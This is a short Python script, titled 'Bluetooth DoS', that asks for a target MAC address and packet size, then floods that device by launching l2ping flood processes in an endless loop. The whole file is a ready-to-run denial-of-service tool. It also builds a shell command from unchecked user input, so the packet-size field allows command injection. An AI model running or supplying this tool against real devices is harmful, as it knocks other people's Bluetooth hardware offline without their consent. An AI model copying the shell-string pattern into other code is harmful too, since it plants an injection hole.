import sys
import subprocess
from time import sleep
import re
def check(str):
    regex = ("^([0-9A-Fa-f]{2}[:-])"+"{5}([0-9A-Fa-f]{2})|" +"([0-9a-fA-F]{4}\\." +"[0-9a-fA-F]{4}\\." +"[0-9a-fA-F]{4})$")
    p = re.compile(regex)
    if (str == None):
        return False
    if(re.search(p, str)):
        return True
    else:
        return False
    
target_addr = input("Enter the target address : ")
packet_size = input("Enter the size of the packet : ")

if(check(target_addr)==0):
    print("Please enter a valid MAC address and try again")
    exit(0)

print("Bluetooth DoS")

# if len(sys.argv) != 3:
#     print("[i] Usage: " + sys.argv[0] + " <target_addr> <packet_size> \n")
#     exit(0)

cmd = "l2ping -i hci0 -s " + packet_size + " -f " + target_addr

while True:
    print("[+] Packet sent to " + target_addr + " -- Packet size: " + packet_size)
    subprocess.Popen(cmd, shell=True)
    sleep(0.200)